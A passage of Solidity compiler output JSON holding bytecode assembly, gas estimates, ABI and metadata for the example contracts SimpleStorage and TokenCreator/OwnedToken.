							"sourceMap": "27:204:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;27:204:4;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;81:61:4;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;81:61:4;;;;;;;;;;;;;;;;;:::i;:::-;;150:78;;;:::i;:::-;;;;;;;;;;;;;;;;;;;81:61;133:1;120:10;:14;;;;81:61;:::o;150:78::-;186:4;210:10;;203:17;;150:78;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "39800",
								"executionCost": "93",
								"totalCost": "39893"
							},
							"external": {
								"get()": "1013",
								"set(uint256)": "20220"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 27,
									"end": 231,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 27,
									"end": 231,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 27,
									"end": 231,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 27,
									"end": 231,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 27,
									"end": 231,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 27,
									"end": 231,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 27,
									"end": 231,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 27,
									"end": 231,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 27,
									"end": 231,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 27,
									"end": 231,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 27,
									"end": 231,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 27,
									"end": 231,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220381d7803370b25e1ecf8d094d660db2ecda0db6760699ce5195a6fb31127965064736f6c63430006060033",
									".code": [
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 27,
											"end": 231,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH",
											"source": 4,
											"value": "60FE47B1"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH",
											"source": 4,
											"value": "6D4CE63C"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 27,
											"end": 231,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 27,
											"end": 231,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 81,
											"end": 142,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 81,
											"end": 142,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "tag",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "STOP",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "9"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "tag",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "RETURN",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "tag",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 81,
											"end": 142,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 133,
											"end": 134,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 120,
											"end": 130,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 120,
											"end": 134,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 120,
											"end": 134,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 120,
											"end": 134,
											"name": "SSTORE",
											"source": 4
										},
										{
											"begin": 120,
											"end": 134,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 81,
											"end": 142,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "tag",
											"source": 4,
											"value": "9"
										},
										{
											"begin": 150,
											"end": 228,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 186,
											"end": 190,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 210,
											"end": 220,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 210,
											"end": 220,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 203,
											"end": 220,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 203,
											"end": 220,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 150,
											"end": 228,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"get()": "6d4ce63c",
							"set(uint256)": "60fe47b1"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"get\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"x\",\"type\":\"uint256\"}],\"name\":\"set\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"SimpleStorage\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 1728,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:SimpleStorage",
								"label": "storedData",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"TokenCreator": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "contract OwnedToken",
									"name": "tokenAddress",
									"type": "address"
								},
								{
									"internalType": "bytes32",
									"name": "name",
									"type": "bytes32"
								}
							],
							"name": "changeName",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "name",
									"type": "bytes32"
								}
							],
							"name": "createToken",
							"outputs": [
								{
									"internalType": "contract OwnedToken",
									"name": "tokenAddress",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x7379b422\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xae3edb65\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x40\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      stop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n    tag_4:\n      tag_8\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_9:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_10\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n    tag_7:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8147  tokenAddress */\n      dup2\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8158  tokenAddress.changeName */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x898855ed\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8159:8163  name */\n      dup3\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8164  tokenAddress.changeName(name) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_12:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8164  tokenAddress.changeName(name) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_14:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":8135:8164  tokenAddress.changeName(name) */\n      pop\n      pop\n      pop\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7748:8172  function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n    tag_10:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7269:7292  OwnedToken tokenAddress */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7727:7731  name */\n      dup2\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7712:7732  new OwnedToken(name) */\n      mload(0x40)\n      tag_16\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create\n      dup1\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_18:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7712:7732  new OwnedToken(name) */\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7705:7732  return new OwnedToken(name) */\n      swap1\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7202:7740  function createToken(bytes32 name)\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7173:8998  contract TokenCreator {\r... */\n    tag_17:\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    stop\n\n    sub_0: assembly {\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n          mstore(0x40, 0x80)\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          callvalue\n            /* \"--CODEGEN--\":5:14   */\n          dup1\n            /* \"--CODEGEN--\":2:4   */\n          iszero\n          tag_1\n          jumpi\n            /* \"--CODEGEN--\":27:28   */\n          0x00\n            /* \"--CODEGEN--\":24:25   */\n          dup1\n            /* \"--CODEGEN--\":17:29   */\n          revert\n            /* \"--CODEGEN--\":2:4   */\n        tag_1:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          pop\n          mload(0x40)\n          sub(codesize, bytecodeSize)\n          dup1\n          bytecodeSize\n          dup4\n          codecopy\n          dup2\n          dup2\n          add\n          0x40\n          mstore\n            /* \"--CODEGEN--\":15:17   */\n          0x20\n            /* \"--CODEGEN--\":10:13   */\n          dup2\n            /* \"--CODEGEN--\":7:18   */\n          lt\n            /* \"--CODEGEN--\":4:6   */\n          iszero\n          tag_2\n          jumpi\n            /* \"--CODEGEN--\":31:32   */\n          0x00\n            /* \"--CODEGEN--\":28:29   */\n          dup1\n            /* \"--CODEGEN--\":21:33   */\n          revert\n            /* \"--CODEGEN--\":4:6   */\n        tag_2:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          dup2\n          add\n          swap1\n          dup1\n          dup1\n          mload\n          swap1\n          0x20\n          add\n          swap1\n          swap3\n          swap2\n          swap1\n          pop\n          pop\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4716:4726  msg.sender */\n          caller\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4708:4713  owner */\n          0x01\n          0x00\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4708:4726  owner = msg.sender */\n          0x0100\n          exp\n          dup2\n          sload\n          dup2\n          0xffffffffffffffffffffffffffffffffffffffff\n          mul\n          